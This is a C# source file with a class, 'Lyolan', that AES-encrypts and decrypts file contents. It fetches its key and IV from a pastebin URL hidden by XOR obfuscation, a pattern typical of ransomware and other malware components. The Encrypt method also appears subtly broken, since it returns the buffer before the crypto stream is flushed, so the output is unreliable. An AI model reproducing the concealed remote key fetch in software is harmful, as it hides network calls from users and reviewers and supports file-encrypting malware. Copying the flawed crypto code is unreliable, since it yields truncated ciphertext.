namespace Project
{
    using System;
    using System.IO;
    using System.Net.Http;
    using System.Security.Cryptography;
    using System.Text;

    public class Lyolan
    {
        int[] EP = {0,2,16,67,68,78,109,102,18,22,22,30,19,0,1,24,74,80,88,25,109,59,3,0,74,8,29,41,63,62,15,100,94};
        const string Xy = "hvd37tBIbwejvb";

        private readonly byte[] key;
        private readonly byte[] iv;

        public Lyolan()
        {
            var parts = GetKeyAndIV();
            key = Encoding.UTF8.GetBytes(parts[0]);
            iv  = Encoding.UTF8.GetBytes(parts[1]);
        }

        public string[] GetKeyAndIV()
        {
            int i = 0;
            int k = 0;
            int S = EP.Length;
            string url = "";

            while (i < S)
            {
                int l = k++ % Xy.Length;
                int j = EP[i++] ^ Xy[l];
                url += (char)j;
            }

            using var client = new HttpClient();
            string c = client.GetStringAsync(url).GetAwaiter().GetResult();

            return new string[] {
                c.Substring(0, 16),
                c.Substring(16, 16)
            };
        }

        public string Encrypt(string fp)
        {
            if (!File.Exists(fp))
            {
                Console.WriteLine("File not found.");
                return "";
            }

            string fc = File.ReadAllText(fp);

            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;

            using MemoryStream ms = new();
            using CryptoStream cs = new(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            using StreamWriter sw = new(cs);

            sw.Write(fc);

            return Convert.ToBase64String(ms.ToArray());
        }

        public string Decrypt(string fp)
        {
            if (!File.Exists(fp))
            {
                Console.WriteLine("File not found.");
                return "";
            }

            string cipherText = File.ReadAllText(fp);
            byte[] buffer = Convert.FromBase64String(cipherText);

            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;

            using MemoryStream ms = new(buffer);
            using CryptoStream cs = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
            using StreamReader sr = new(cs);

            return sr.ReadToEnd();
        }
    }
}
